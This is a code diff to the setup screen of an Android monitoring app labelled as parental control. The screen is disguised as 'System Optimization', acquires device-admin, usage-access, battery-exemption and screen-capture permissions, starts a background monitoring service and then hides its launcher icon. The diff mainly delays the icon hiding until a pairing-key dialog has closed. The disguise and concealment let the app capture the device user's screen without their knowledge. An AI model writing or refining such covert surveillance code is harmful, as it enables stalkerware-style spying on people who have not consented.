@@ -3,8 +3,6 @@ package com.parentalcontrol.kidmonitor
 import android.app.Activity
 import android.app.AppOpsManager
 import android.app.admin.DevicePolicyManager
-import android.content.ClipData
-import android.content.ClipboardManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
@@ -13,29 +11,36 @@ import android.media.projection.MediaProjectionManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.os.PowerManager
 import android.provider.Settings
 import android.view.View
 import android.widget.Button
 import android.widget.ProgressBar
 import android.widget.TextView
-import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import android.Manifest
 import java.util.UUID
 
 /**
- * One-time setup screen. Disguised as "System Optimization".
- * After all permissions are granted, it:
- *  1. Generates a unique pairing key for this device (if not already set)
- *  2. Shows the pairing key so the parent can enter it in the Parent app
- *  3. Hides the launcher icon
- *  4. Starts MonitorService
- *  5. Finishes itself
+ * One-time setup screen (disguised as "System Optimization").
+ *
+ * On EVERY launch it checks if the pairing key has been shown yet.
+ * If not, it shows the key dialog first — BEFORE hiding the icon — so the
+ * activity is never killed mid-dialog by Android's component-disable logic.
+ *
+ * Flow (fresh install):
+ *   1. Grant all permissions
+ *   2. Screen capture granted → service started → KEY DIALOG shown
+ *   3. User taps Done/Copy → icon hidden → activity finishes
+ *
+ * Flow (reinstall / upgrade — setup already done):
+ *   1. Key generated (if missing) → KEY DIALOG shown immediately
+ *   2. User taps Done → ensure service is running → finish
  */
 class SetupActivity : AppCompatActivity() {
 
@@ -45,6 +50,7 @@ class SetupActivity : AppCompatActivity() {
     private lateinit var progressBar: ProgressBar
 
     private val prefs by lazy { getSharedPreferences(PREFS_NAME, MODE_PRIVATE) }
+    private val mainHandler = Handler(Looper.getMainLooper())
 
     // ─── Permission Launchers ─────────────────────────────────────────
     private val notifPermLauncher = registerForActivityResult(
@@ -55,18 +61,18 @@ class SetupActivity : AppCompatActivity() {
         ActivityResultContracts.StartActivityForResult()
     ) { result ->
         if (result.resultCode == Activity.RESULT_OK && result.data != null) {
-            // Save projection result for service
             prefs.edit()
                 .putInt(KEY_PROJ_RESULT_CODE, result.resultCode)
                 .putBoolean(KEY_SETUP_DONE, true)
                 .apply()
-
-            // Start monitor service with projection data
             MonitorService.startWithProjection(this, result.resultCode, result.data!!)
-            finishSetup()
+            // Show key dialog — DO NOT hide icon yet
+            showCompletionStatus()
+            showPairingKeyDialog(afterSetup = true)
         } else {
             tvStatus.text = "Screen permission required. Tap to retry."
             btnAction.text = "Grant Permission"
+            btnAction.visibility = View.VISIBLE
             btnAction.setOnClickListener { requestScreenCapture() }
         }
     }
@@ -87,33 +93,35 @@ class SetupActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // Ensure pairing key exists (generate once, never regenerate)
+        // Always generate key first (idempotent)
         ensurePairingKey()
 
-        // If already setup, ensure service running then show key if not yet seen
+        // If setup already done → show key (if not yet seen), then finish
         if (prefs.getBoolean(KEY_SETUP_DONE, false)) {
-            ensureServiceRunning()
-            // Show key dialog if the user hasn't seen it yet (e.g. reinstall / upgrade)
             if (!prefs.getBoolean(KEY_KEY_SHOWN, false)) {
+                // Inflate layout minimally so dialog can attach to window
                 setContentView(R.layout.activity_setup)
                 btnAction   = findViewById(R.id.btnAction)
                 tvStatus    = findViewById(R.id.tvStatus)
                 progressBar = findViewById(R.id.progressBar)
                 btnAction.visibility   = View.GONE
                 progressBar.visibility = View.INVISIBLE
-                tvStatus.text = "Retrieving pairing key..."
-                showPairingKeyDialog()
+                tvStatus.text = "Your pairing key:"
+                // Show immediately — NO delay, NO hideAppIcon before dialog
+                showPairingKeyDialog(afterSetup = false)
             } else {
+                // Key already shown — just ensure service and leave silently
+                ensureServiceRunning()
                 finish()
             }
             return
         }
 
+        // First-time setup
         setContentView(R.layout.activity_setup)
         mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-
-        btnAction = findViewById(R.id.btnAction)
-        tvStatus = findViewById(R.id.tvStatus)
+        btnAction   = findViewById(R.id.btnAction)
+        tvStatus    = findViewById(R.id.tvStatus)
         progressBar = findViewById(R.id.progressBar)
 
         btnAction.setOnClickListener { nextStep() }
@@ -123,7 +131,6 @@ class SetupActivity : AppCompatActivity() {
     // ─── Pairing Key ──────────────────────────────────────────────────
     private fun ensurePairingKey() {
         if (prefs.getString(KEY_PAIRING_KEY, null) == null) {
-            // Generate a random 8-character uppercase alphanumeric key
             val key = UUID.randomUUID().toString()
                 .replace("-", "")
                 .take(8)
@@ -143,7 +150,6 @@ class SetupActivity : AppCompatActivity() {
         }
     }
 
-    // Notification permission (Android 13+)
     private fun hasNotificationPermission(): Boolean {
         return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) ==
@@ -158,7 +164,6 @@ class SetupActivity : AppCompatActivity() {
         }
     }
 
-    // Usage stats permission
     private fun hasUsageStatsPermission(): Boolean {
         val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
         val mode = appOps.checkOpNoThrow(
@@ -174,11 +179,9 @@ class SetupActivity : AppCompatActivity() {
         usagePermLauncher.launch(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
     }
 
-    // Device Admin
     private fun isDeviceAdminActive(): Boolean {
         val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
-        return dpm.isAdminActive(adminComponent)
+        return dpm.isAdminActive(ComponentName(this, DeviceAdminReceiver::class.java))
     }
 
     private fun requestDeviceAdmin() {
@@ -192,7 +195,6 @@ class SetupActivity : AppCompatActivity() {
         deviceAdminLauncher.launch(intent)
     }
 
-    // Battery optimization
     private fun isBatteryOptIgnored(): Boolean {
         val pm = getSystemService(POWER_SERVICE) as PowerManager
         return pm.isIgnoringBatteryOptimizations(packageName)
@@ -200,65 +202,79 @@ class SetupActivity : AppCompatActivity() {
 
     private fun requestBatteryOptimization() {
         setStatus("Optimizing battery usage...", 75)
-        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-            data = Uri.parse("package:$packageName")
-        }
-        batteryOptLauncher.launch(intent)
+        batteryOptLauncher.launch(
+            Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                data = Uri.parse("package:$packageName")
+            }
+        )
     }
 
-    // Screen capture (MediaProjection)
     private fun requestScreenCapture() {
         setStatus("Enabling screen monitoring...", 90)
         screenCaptureLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
     }
 
-    // ─── Finish Setup ─────────────────────────────────────────────────
-    private fun finishSetup() {
-        setStatus("Setup complete! Optimizing...", 100)
+    // ─── Completion UI (shown while dialog is about to appear) ────────
+    private fun showCompletionStatus() {
+        tvStatus.text = "Setup complete ✓"
+        progressBar.progress = 100
         progressBar.visibility = View.INVISIBLE
         btnAction.visibility = View.GONE
-
-        // Hide app icon from launcher
-        hideAppIcon()
-
-        // Show pairing key dialog after a short delay
-        btnAction.postDelayed({ showPairingKeyDialog() }, 800)
     }
 
-    private fun showPairingKeyDialog() {
-        val pairingKey = prefs.getString(KEY_PAIRING_KEY, null)
-
-        // If somehow key doesn't exist yet, generate it now
-        if (pairingKey == null) {
-            ensurePairingKey()
-        }
+    // ─── Pairing key dialog ───────────────────────────────────────────
+    /**
+     * @param afterSetup  true = fresh setup just finished (icon not hidden yet)
+     *                    false = reopened app with setup already done
+     */
+    private fun showPairingKeyDialog(afterSetup: Boolean) {
+        ensurePairingKey()
         val key = prefs.getString(KEY_PAIRING_KEY, "ERROR") ?: "ERROR"
 
-        // Mark as shown so we don't keep re-showing it
+        // Record that we showed the key
         prefs.edit().putBoolean(KEY_KEY_SHOWN, true).apply()
 
-        android.app.AlertDialog.Builder(this)
-            .setTitle("📱 Device Pairing Key")
-            .setMessage(
-                "Your device pairing key is:\n\n" +
-                "  $key\n\n" +
-                "Enter this key in the Parent Monitor app to link this device.\n\n" +
-                "Keep this key private — only share with trusted parents."
-            )
-            .setPositiveButton("Copy & Done") { _, _ ->
-                val clipboard = getSystemService(CLIPBOARD_SERVICE) as android.content.ClipboardManager
-                clipboard.setPrimaryClip(android.content.ClipData.newPlainText("Pairing Key", key))
-                android.widget.Toast.makeText(this, "✅ Key copied: $key", android.widget.Toast.LENGTH_LONG).show()
-                finish()
+        val message = "Your device pairing key:\n\n" +
+            "        $key\n\n" +
+            "Open the Parent Monitor app and tap\n" +
+            "\"➕ Add Kid Device\", then enter this key.\n\n" +
+            "Keep it private — only share with trusted parents."
+
+        AlertDialog.Builder(this)
+            .setTitle("📱 Pairing Key")
+            .setMessage(message)
+            .setPositiveButton("📋 Copy & Done") { _, _ ->
+                copyKey(key)
+                onDialogDismissed(afterSetup)
             }
-            .setNeutralButton("Show Again Later") { _, _ ->
-                // Reset the flag so it shows again next launch
+            .setNegativeButton("Done") { _, _ ->
+                onDialogDismissed(afterSetup)
+            }
+            .setNeutralButton("Show Again Next Time") { _, _ ->
+                // Reset flag so it shows again
                 prefs.edit().putBoolean(KEY_KEY_SHOWN, false).apply()
-                finish()
+                onDialogDismissed(afterSetup)
             }
-            .setNegativeButton("Done") { _, _ -> finish() }
             .setCancelable(false)
             .show()
+    }
+
+    private fun onDialogDismissed(afterSetup: Boolean) {
+        if (afterSetup) {
+            // NOW it is safe to hide the icon (dialog is gone, nothing to kill)
+            hideAppIcon()
+        } else {
+            // Ensure service is running then finish quietly
+            ensureServiceRunning()
+        }
+        finish()
+    }
+
+    private fun copyKey(key: String) {
+        val cm = getSystemService(CLIPBOARD_SERVICE) as android.content.ClipboardManager
+        cm.setPrimaryClip(android.content.ClipData.newPlainText("Pairing Key", key))
+        android.widget.Toast.makeText(this,
+            "✅ Key copied: $key", android.widget.Toast.LENGTH_LONG).show()
     }
 
     private fun hideAppIcon() {
@@ -271,7 +287,6 @@ class SetupActivity : AppCompatActivity() {
 
     private fun ensureServiceRunning() {
         if (!MonitorService.isRunning) {
-            // Need re-request for MediaProjection — show trampoline
             val intent = Intent(this, ProjectionRequestActivity::class.java)
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             startActivity(intent)
@@ -285,11 +300,11 @@ class SetupActivity : AppCompatActivity() {
     }
 
     companion object {
-        const val PREFS_NAME           = "monitor_prefs"
-        const val KEY_SETUP_DONE       = "setup_done"
+        const val PREFS_NAME            = "monitor_prefs"
+        const val KEY_SETUP_DONE        = "setup_done"
         const val KEY_PROJ_RESULT_CODE  = "proj_result_code"
-        const val KEY_DEVICE_ID        = "device_id"
-        const val KEY_PAIRING_KEY      = "pairing_key"
-        const val KEY_KEY_SHOWN        = "pairing_key_shown"  // whether dialog was shown
+        const val KEY_DEVICE_ID         = "device_id"
+        const val KEY_PAIRING_KEY       = "pairing_key"
+        const val KEY_KEY_SHOWN         = "pairing_key_shown"
     }
 }
